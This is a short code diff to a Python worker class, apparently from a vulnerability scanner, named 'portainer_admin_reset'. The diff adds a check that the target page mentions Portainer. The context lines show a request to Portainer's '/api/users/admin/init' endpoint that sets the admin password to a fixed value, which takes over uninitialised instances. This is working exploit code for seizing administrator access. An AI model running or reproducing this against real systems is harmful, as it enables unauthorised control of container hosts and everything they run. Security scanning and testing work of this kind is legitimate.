@@ -6,6 +6,11 @@ class PortainerAdmin(BaseWorker):
     name = "portainer_admin_reset"
     references = ["https://github.com/portainer/portainer/issues/493"]
     def run(self):
+        r = self.session.get(self.domain)
+
+        if "portainer" not in r.text.lower():
+            return
+
         r = self.session.post(
             urljoin(self.domain, "/api/users/admin/init"),
             json={"username": "admin", "password":"definitely_valid"}
